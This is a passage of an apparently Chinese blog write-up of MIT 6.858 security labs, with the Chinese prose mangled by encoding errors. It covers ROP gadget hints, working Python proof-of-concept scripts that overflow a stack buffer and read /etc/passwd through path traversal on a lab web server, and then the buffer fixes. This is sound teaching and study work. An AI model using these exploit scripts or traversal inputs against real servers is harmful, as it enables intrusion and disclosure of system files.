<p><em>Challenge! (optional)</em> The <code>accidentally</code> function is a bit artificial. For extra credit, figure out how to perform the return-to-libc attack without relying on that function (delete it and find another way to make your exploit work). Provide your attack in <code>exploit-challenge.py</code>. Also, briefly explain the attack and provide ROP gadgets you use in <code>answers.txt</code>.</p>
<p>You will need to find another chunk of code to reuse that gives you control over <code>%rdi</code>. You can read through the disassembly (e.g. using <code>objdump</code>) to look for useful ROP gadgets.</p>
<p>Because of the nature of x86&#x2F;x86-64, you can use another technique to find sequences of instructions that donâ€™t even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence <code>pop %r15; ret</code> corresponds to the machine code <code>41 5F C3</code>. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code <code>5F C3</code> corresponds to the assembly <code>pop %rdi; ret</code>.</p>
<p>Automated tools such as <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget.py</a> can assist you in searching for ROP gadgets, even finding gadgets that arise from misaligned parses. The 6.858 VM already has <code>ROPgadget</code> installed.</p>
<p>You may find it useful to search for ROP gadgets not just in the <code>zookd</code> binary but in other libraries that <code>zookd</code> loads at runtime. To see these libraries, and the addresses at which they are loaded, you can run <strong>( ulimit -s unlimited &amp;&amp; setarch -R ldd zookd-nxstack )</strong>. The <code>ulimit</code> and <code>setarch</code> commands set up the same environment used by <code>clean-env.sh</code>, so that <code>ldd</code> prints the same addresses that will be used at runtime.</p>
</blockquote>
<p>ç¬”è€…ä¸€å¼€å§‹çš„æ€è·¯å°±æ˜¯ä¸ç”¨  <code>accidentally()</code> ï¼ˆéå¸¸è«åå…¶å¦™çš„ä¸€ä¸ªå‡½æ•°ï¼‰ï¼Œæ‰€ä»¥ç­‰äºæ˜¯ç›´æ¥é€šè¿‡äº†ï¼ˆç¬‘ï¼‰</p>
<h2 id="Part-4-Fixing-buffer-overflows-and-other-bugs"><a href="#Part-4-Fixing-buffer-overflows-and-other-bugs" class="headerlink" title="Part 4: Fixing buffer overflows and other bugs"></a>Part 4: Fixing buffer overflows and other bugs</h2><p>è¿™ä¸€å—å°±æ˜¯ä¸¤ä¸ª Exerciseï¼Œ å…ˆçœ‹ Exercise 6ï¼Œè®©æˆ‘ä»¬å¯»æ‰¾ç¨‹åºä¸­çš„å…¶ä»–æ¼æ´ï¼ˆè‡³å°‘ä¸¤ä¸ªï¼Œé™¤äº† <code>zoobar</code> ä¸­çš„ä»¥å¤–ï¼Œé‚£ä¸ªæ˜¯ç•™ç»™æœªæ¥çš„å…¶ä»– labs çš„ï¼‰ï¼š</p>
<blockquote>
<p><strong>Exercise 6.</strong> Look through the source code and try to find more vulnerabilities that can allow an attacker to compromise the security of the web server. Describe the attacks you have found in <code>answers.txt</code>, along with an explanation of the limitations of the attack, what an attacker can accomplish, why it works, and how you might go about fixing or preventing it. You should ignore bugs in <code>zoobar</code>â€˜s code. They will be addressed in future labs.</p>
<p>One approach for finding vulnerabilities is to trace the flow of inputs controlled by the attacker through the server code. At each point that the attackerâ€™s input is used, consider all the possible values the attacker might have provided at that point, and what the attacker can achieve in that manner.</p>
<p>You should find at least two vulnerabilities for this exercise.</p>
</blockquote>
<p><del>æºç å®¡è®¡è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯</del>ç¬”è€…å®¡äº†å¤§åŠå¤©å¥½åƒä¹Ÿæ²¡æ‰¾åˆ°é™¤äº†ä¸Šé¢çš„ bug ä»¥å¤–çš„ bugï¼Œè¿˜å¥½åé¢è¿˜æ˜¯æ‰¾åˆ°äº†ä¸€äº›</p>
<p>é¦–å…ˆæ˜¯åœ¨ <code>process_client()</code> ä¸­å­˜å‚¨è¯·æ±‚ URL çš„é•¿åº¦çš„ä½ç½®å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå› ä¸ºä¸€æ¬¡æœ€å¤šä¸€è¡Œè¯» 8192 å­—èŠ‚ï¼Œä½†è¿™é‡Œæ˜æ˜¾æ²¡æœ‰é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];		<span class="hljs-comment">// åªç•™äº†4096å­—èŠ‚</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span> <span class="hljs-comment">// è¿™é‡Œä¸€æ¬¡æœ€å¤šè¯» 8192 å­—èŠ‚</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br></code></pre></td></tr></table></figure>

<p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> * <span class="hljs-number">768</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸ crashï¼Œä¸è¿‡è¿™é‡Œå¹¶éå› ä¸ºéæ³•è¿”å›åœ°å€ crashï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ä»¬è¦†å†™æ‰äº†æ ˆä¸Šçš„ <code>errmsg</code> å˜é‡å¯¼è‡´éæ³•å†…å­˜å¼•ç”¨ä»è€Œ crash</p>
<p><img src="https://s2.loli.net/2022/12/04/t9vq36KXmZOIslJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç¬¬äºŒä¸ªæ¼æ´æ˜¯åœ¨ <code>http_serve</code> ä¸­å­˜åœ¨ç›®å½•ç©¿è¶Šçš„é—®é¢˜ï¼Œç”±äºæ²¡æœ‰å¯¹è·¯å¾„åšè¿‡æ»¤åŠåˆ¤æ–­ï¼Œè¿™å¯ä»¥è®©æˆ‘ä»¬è®¿é—®åˆ°æœåŠ¡å™¨æ ¹ç›®å½•å¤–çš„æ–‡ä»¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = http_serve_none;<br>    <span class="hljs-type">char</span> pn[<span class="hljs-number">2048</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    getcwd(pn, <span class="hljs-keyword">sizeof</span>(pn));<br>    setenv(<span class="hljs-string">&quot;DOCUMENT_ROOT&quot;</span>, pn, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) + <span class="hljs-built_in">strlen</span>(pn) + <span class="hljs-number">1</span> &gt;= <span class="hljs-keyword">sizeof</span>(pn)) &#123;<br>        http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;Request too long&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">strncat</span>(pn, name, <span class="hljs-keyword">sizeof</span>(pn) - <span class="hljs-built_in">strlen</span>(pn) - <span class="hljs-number">1</span>);<br>    split_path(pn);<br><br>    <span class="hljs-keyword">if</span> (!stat(pn, &amp;st))<br>    &#123;<br>        <span class="hljs-comment">/* executable bits -- run as CGI script */</span><br>        <span class="hljs-keyword">if</span> (valid_cgi_script(&amp;st))<br>            handler = http_serve_executable;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(st.st_mode))<br>            handler = http_serve_directory;<br>        <span class="hljs-keyword">else</span><br>            handler = http_serve_file;<br>    &#125;<br><br>    handler(fd, pn);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pn)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">if</span> ((filefd = open(pn, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;open %s: %s&quot;</span>, pn, strerror(errno));<br><br>	<span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BSD</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (!fstat(filefd, &amp;st))<br>        len = st.st_size;<br>    <span class="hljs-keyword">if</span> (sendfile(fd, filefd, <span class="hljs-number">0</span>, len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">if</span> (sendfile(filefd, fd, <span class="hljs-number">0</span>, &amp;len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;sendfile&quot;</span>);<br>    close(filefd);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç®€å•å†™ä¸ªè„šæœ¬æµ‹è¯•ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /../../../../etc/passwd&quot;</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;REQUEST_URI: &quot;</span> + <span class="hljs-string">b&quot;index.html&quot;</span>  + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸè®¿é—®åˆ° <code>/etc/passwd</code></p>
<p><img src="https://s2.loli.net/2022/12/04/dlv6JVCk91QhcyW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>Exercise 6 é‡Œè¯´ <code>You should find at least two vulnerabilities for this exercise.</code> ï¼Œç¬”è€…å·²ç»æ‰¾è¶³ä¸¤ä¸ªï¼Œæ»¡è¶³äº†é¢˜ç›®è¦æ±‚ï¼Œå°±ä¸ç»§ç»­æ‰¾æ›´å¤šçš„äº†ï¼ˆç¬‘ï¼‰<del>ğŸ‘´é€‰æ‹©ç›´æ¥æ‘†å¤§çƒ‚</del></p>
<p>æ¥ä¸‹æ¥çœ‹æœ€åä¸€ä¸ª Exerciseï¼Œè®©æˆ‘ä»¬è¿›è¡Œæ¼æ´ä¿®å¤ï¼Œä¸»è¦æ˜¯ä¿®æ‰¾åˆ°çš„æ ˆæº¢å‡ºæ¼æ´ï¼š</p>
<blockquote>
<p><strong>Exercise 7.</strong> For each buffer overflow vulnerability you have exploited in Exercises 2, 4, and 5, fix the web serverâ€™s code to prevent the vulnerability in the first place. Do not rely on compile-time or runtime mechanisms such as <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, removing <code>-fno-stack-protector</code>, baggy bounds checking, etc.</p>
<p>Make sure that your code actually stops your exploits from working. Use <strong>make check-fixed</strong> to run your exploits against your modified source code (as opposed to the staff reference binaries from <code>bin.tar.gz</code>). These checks should report FAIL (i.e., exploit no longer works). If they report PASS, this means the exploit still works, and you did not correctly fix the vulnerability.</p>
<p>Note that your submission should <em>not</em> make changes to the <code>Makefile</code> and other grading scripts. We will use our unmodified version during grading.</p>
<p>You should also make sure your code still passes all tests using <strong>make check</strong>, which uses the unmodified lab binaries.</p>
</blockquote>
<p>ä¸»è¦æ˜¯ä¿®è¿™ä¸¤ä¸ªåœ°æ–¹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>	<span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> value[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼Œæ”»å‡»å…¨éƒ¨å¤±è´¥ä»£è¡¨æˆåŠŸï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-fixed</span><br></code></pre></td></tr></table></figure>

<p>æˆåŠŸé€šè¿‡âˆš</p>
<p><img src="https://s2.loli.net/2022/12/04/6XNYjFW7BdPr1Re.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è‡³æ­¤ï¼Œ Lab1 å…¨éƒ¨å®Œæˆ</p>
<h1 id="0x02-Lab-2-Privilege-separation-and-server-side-sandboxingï¼ˆuncompletedï¼‰"><a href="#0x02-Lab-2-Privilege-separation-and-server-side-sandboxingï¼ˆuncompletedï¼‰" class="headerlink" title="0x02.Lab 2: Privilege separation and server-side sandboxingï¼ˆuncompletedï¼‰"></a>0x02.Lab 2: Privilege separation and server-side sandboxingï¼ˆuncompletedï¼‰</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>è¿™ä¸€ä¸ª lab ä¸»è¦æ˜¯å…³äº <strong>æƒé™åˆ†ç¦»</strong> ï¼ˆprivilege separationï¼‰ä¸ <strong>æœåŠ¡å™¨ä¾§æ²™ç®±</strong>ï¼ˆserver-side sandboxingï¼‰ï¼Œè¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ä¸»è¦é€šè¿‡ä¸€ä¸ª MIT ç¼–å†™çš„åä¸º <code>zoobar</code> çš„ python web åº”ç”¨æ¥å®Œæˆï¼Œå…¶ä¸­æƒé™éš”ç¦»çš„ç›®çš„æ˜¯ä¿è¯æ”»å‡»è€…åœ¨ç ´åç¨‹åºçš„ä¸€éƒ¨åˆ†æ—¶ä¸ä¼šç ´ååˆ°ç¨‹åºçš„å¦ä¸€éƒ¨åˆ†ï¼Œè¯¥ lab å°†ä½¿ç”¨ <a target="_blank" rel="noopener" href="https://linuxcontainers.org/">Linux containers</a> æ¥å®Œæˆ</p>
<blockquote>
<p>æ­¤å‰çš„ lab ä¸­ä½¿ç”¨çš„æ˜¯åœ¨è¯¾ä¸Šè®²è¿‡çš„ OKWS web serverï¼ˆ<del>ğŸ‘´æ²¡å¬è¯¾ï¼Œå¯„äº†</del>ï¼‰</p>
</blockquote>
<p>æœ¬ lab ä¸­æˆ‘ä»¬å°†å®Œæˆä¸€ä¸ªæƒé™éš”ç¦»çš„ web serverï¼Œæ£€æŸ¥çœ‹ä½ çš„æ¼æ´ï¼Œå¹¶å°†ç¨‹åºä»£ç åˆ†å‰²æˆéœ€è¦æ›´å°‘æƒé™çš„å†…å®¹å¿«ä»¥æœ€å°åŒ–å•ä¸ªæ¼æ´çš„å½±å“ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å°†æ‰©å±• Zoobar ä»¥ä½¿å…¶æ”¯æŒ  <em>å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</em>  ï¼ˆexecutable profilesï¼‰ï¼Œè¿™å…è®¸æˆ‘ä»¬ä½¿ç”¨ python æ¥ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œå¹¶å®Œæˆä¸åŒç”¨æˆ·é…ç½®æ–‡ä»¶çš„éš”ç¦»ï¼Œè¿™å…è®¸ç”¨æˆ·åœ¨å…¶é…ç½®æ–‡ä»¶ä¸­å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ä¸€ä¸ªæŒ‰ç”¨æˆ·åæ¬¢è¿è®¿å®¢çš„ profile</li>
<li>ä¸€ä¸ªè®°å½•æœ€åå‡ ä½è®¿å®¢çš„ profile</li>
<li>ä¸€ä¸ªä¸ºæ¯ä½è®¿å®¢æä¾› zoobar çš„ profileï¼ˆé™åˆ¶ä¸ºæ¯åˆ†é’Ÿ1ä½ï¼‰</li>
</ul>
<p>è¿™éœ€è¦æ²™ç®±åŒ–æœåŠ¡å™¨ä¸Šçš„ profile code ä»è€Œé¿å…ä»»æ„ä»£ç æ‰§è¡Œæˆ–ä»»æ„æ–‡ä»¶è®¿é—®ï¼Œæ­¤å¤–ï¼Œè¿™äº›ä»£ç æˆ–è®¸éœ€è¦ä¿æŒè®°å½•ä¸€äº›æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œæˆ–æ˜¯è®¿é—® zoobar æ•°æ®åº“ä»¥æ­£ç¡®æ‰§è¡Œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åä¸ºåº“çš„è¿œç¨‹è¿‡ç¨‹ä¸ lab æä¾›çš„ä¸€äº›ä»£ç æ¥æ²™ç®±åŒ–å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</p>
<blockquote>
<p>å®éªŒæ‰‹å†ŒåŸæ–‡å°±æŒºä¹±ä¸ƒå…«ç³Ÿçš„ï¼ŒğŸ‘´æ„£æ˜¯æ²¡å’‹çœ‹æ˜ç™½ï¼Œ<del>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´çš„è‹±æ–‡æ°´å¹³å¤ªåƒåœ¾äº†</del></p>
</blockquote>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æŠŠä»£ç åˆ‡åˆ° lab2 çš„åˆ†æ”¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add answers.txt exploit-*.py http.c zookd.c [and any other new files...]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&quot;lab1 solution completed&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab1</span><br></code></pre></td></tr></table></figure>

<p>ä¹‹åè¿˜æ˜¯å…ˆ <code>make</code> æ£€æŸ¥ä¸€ä¸‹ï¼Œæ²¡æŠ¥é”™å°± ğŸ†—ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookfs.o zookfs.c<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http2.o http2.c<br>cc -m64  zookfs.o http2.o   -o zookfs<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd2.o zookd2.c<br>cc -m64  zookd2.o http2.o   -o zookd2<br></code></pre></td></tr></table></figure>

<h2 id="Prelude-Whatâ€™s-a-zoobar"><a href="#Prelude-Whatâ€™s-a-zoobar" class="headerlink" title="Prelude: Whatâ€™s a zoobar?"></a>Prelude: Whatâ€™s a zoobar?</h2><p>ä¸ºäº†ç†è§£ <code>zoobar</code>ï¼Œæˆ‘ä»¬é¦–å…ˆè¿‡ä¸€ä¸‹éƒ¨åˆ†æºç </p>
<p><code>zoobar</code> çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§æ˜¯å…è®¸åœ¨ç”¨æˆ·ä¹‹é—´ä¼ é€’å‡­è¯ï¼ˆcreditsï¼‰ï¼Œè¿™ç”± <code>transfer.py</code> å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥å¯åŠ¨ zoobar æ„Ÿå—ä¸€ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./zookld.py</span><br></code></pre></td></tr></table></figure>

<p>è¿™ç©æ„éœ€è¦ python çš„ <code>lxc</code> æ¨¡å—æ‰èƒ½è·‘ï¼Œä½†æ˜¯ç¬”è€…æ€ä¹ˆéƒ½å®‰ä¸ä¸Šâ€¦<del>lab2 å°±æ­¤å®Œç»“</del> </p>
<p>ç¬”è€…æœ€ç»ˆé€‰æ‹©  <em>æ”¾å¼ƒä½¿ç”¨è‡ªå·±æ­å»ºçš„å®éªŒç¯å¢ƒ</em>  ï¼Œé‡æ–°ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒç¯å¢ƒå»åšå®éªŒï¼Œä½†æ˜¯åœ¨æ‰§è¡Œ <code>./zookld.py</code> æ—¶åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/07/E5rjcJBSFHQOifo.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆè¿™ä¸ªé—®é¢˜çš„å‡ºç°æ˜¯å› ä¸º <strong>Ubuntu 21.10 å·²ç»åœæ­¢æ›´æ–°</strong>ï¼Œæˆ‘ä»¬æ¥çœ‹ <code>zookld.py</code> çš„é€»è¾‘ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç›´æ¥è°ƒç”¨ <code>zookconf.py</code> é‡Œçš„ <code>boot()</code> å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zookconf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        zookconf.boot(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>        zookconf.boot()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    zookconf.restart_with_cgroups()<br>    <span class="hljs-keyword">if</span> os.geteuid() == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Running zookld.py as root! In order to clean up &quot;</span><br>        <span 